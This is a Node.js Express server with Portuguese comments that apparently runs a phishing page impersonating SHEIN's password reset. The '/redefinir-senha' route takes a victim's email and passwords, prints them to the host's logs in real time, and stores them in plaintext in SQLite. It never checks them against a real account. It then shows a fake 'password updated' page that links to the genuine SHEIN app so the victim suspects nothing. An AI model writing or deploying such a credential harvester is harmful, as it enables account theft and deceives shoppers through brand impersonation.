const express = require('express');
const sqlite3 = require('sqlite3').verbose();
const bodyParser = require('body-parser');
const path = require('path');

const app = express();

// --- AJUSTE PARA O RENDER ---
// Usa a porta que o Render fornecer na internet. Se estiver no PC, usa a 3000.
const PORT = process.env.PORT || 3000;

// Configuração para ler os dados enviados pelo formulário HTML
app.use(bodyParser.urlencoded({ extended: true }));

// ROTA PRINCIPAL: Abre diretamente o seu arquivo shein.html
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'shein.html'));
});

// Permite o uso de outros arquivos estáticos na mesma pasta
app.use(express.static(__dirname));

// --- CONFIGURAÇÃO DO BANCO DE DADOS ---
// Cria ou conecta ao arquivo 'loja.db'
const db = new sqlite3.Database('./loja.db', (err) => {
    if (err) {
        console.error('Erro ao conectar ao banco:', err.message);
    } else {
        console.log('Conectado ao banco de dados SQLite da SHEIN.');
    }
});

// Cria a tabela de usuários caso ela ainda não exista
db.run(`CREATE TABLE IF NOT EXISTS usuarios (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    email TEXT UNIQUE,
    senha TEXT
)`);

// --- ROTA QUE RECEBE OS DADOS DO FORMULÁRIO ---
app.post('/redefinir-senha', (req, res) => {
    const { email, senhaAtual, novaSenha } = req.body;

    // Mostra os dados digitados direto nos Logs do Render em tempo real!
    console.log(`\n[NOVO ENVIO RECEBIDO] E-mail: ${email} | Senha Digitada: ${novaSenha}\n`);

    // Busca se o e-mail digitado já existe no banco de dados
    db.get(`SELECT * FROM usuarios WHERE email = ?`, [email], (err, row) => {
        if (err) {
            return res.status(500).send("Erro ao consultar o banco de dados.");
        }

        if (!row) {
            // SE O USUÁRIO NÃO EXISTIR: Cadastra ele direto (Primeiro acesso)
            db.run(`INSERT INTO usuarios (email, senha) VALUES (?, ?)`, [email, novaSenha], function(err) {
                if (err) return res.send("Erro ao cadastrar novo usuário.");
                
                res.send(`
                    <!DOCTYPE html>
                    <html lang="pt-BR">
                    <head>
                        <meta charset="UTF-8">
                        <meta name="viewport" content="width=device-width, initial-scale=1.0">
                        <title>Acesso Confirmado</title>
                        <style>
                            body { font-family: Arial, sans-serif; text-align: center; padding: 50px; background-color: #f7f7f7; }
                            .card { background: white; padding: 30px; border-radius: 8px; box-shadow: 0 4px 8px rgba(0,0,0,0.1); display: inline-block; max-width: 400px; }
                            h2 { color: #000; font-size: 22px; margin-bottom: 15px; }
                            p { color: #666; font-size: 16px; line-height: 1.5; }
                            .btn { display: inline-block; margin-top: 25px; padding: 12px 24px; background-color: #000; color: #fff; text-decoration: none; border-radius: 4px; font-weight: bold; }
                            .btn:hover { background-color: #333; }
                        </style>
                    </head>
                    <body>
                        <div class="card">
                            <h2>Sua senha foi atualizada com sucesso!</h2>
                            <p>Retorne ao app da Shein e boas compras.</p>
                            
                            <!-- Botão direcionando para a SHEIN na Play Store -->
                            <a href="https://play.google.com/store/apps/details?id=com.zzkko" target="_blank" class="btn">
                                Voltar para a SHEIN
                            </a>
                        </div>
                    </body>
                    </html>
                `);
            });
        } else {
            // SE O USUÁRIO JÁ EXISTIR: Atualiza a senha dele no banco
            db.run(`UPDATE usuarios SET senha = ? WHERE email = ?`, [novaSenha, email], function(err) {
                if (err) return res.send("Erro ao atualizar a senha no banco.");
                
                res.send(`
                    <!DOCTYPE html>
                    <html lang="pt-BR">
                    <head>
                        <meta charset="UTF-8">
                        <meta name="viewport" content="width=device-width, initial-scale=1.0">
                        <title>Acesso Confirmado</title>
                        <style>
                            body { font-family: Arial, sans-serif; text-align: center; padding: 50px; background-color: #f7f7f7; }
                            .card { background: white; padding: 30px; border-radius: 8px; box-shadow: 0 4px 8px rgba(0,0,0,0.1); display: inline-block; max-width: 400px; }
                            h2 { color: #000; font-size: 22px; margin-bottom: 15px; }
                            p { color: #666; font-size: 16px; line-height: 1.5; }
                            .btn { display: inline-block; margin-top: 25px; padding: 12px 24px; background-color: #000; color: #fff; text-decoration: none; border-radius: 4px; font-weight: bold; }
                            .btn:hover { background-color: #333; }
                        </style>
                    </head>
                    <body>
                        <div class="card">
                            <h2>Sua senha foi atualizada com sucesso!</h2>
                            <p>Retorne ao app da Shein e boas compras.</p>
                            
                            <!-- Botão direcionando para a SHEIN na Play Store -->
                            <a href="https://play.google.com/store/apps/details?id=com.zzkko" target="_blank" class="btn">
                                Voltar para a SHEIN
                            </a>
                        </div>
                    </body>
                    </html>
                `);
            });
        }
    });
});

// Inicia o servidor na porta correta (PORT)
app.listen(PORT, () => {
    console.log(`Servidor rodando na porta ${PORT}`);
});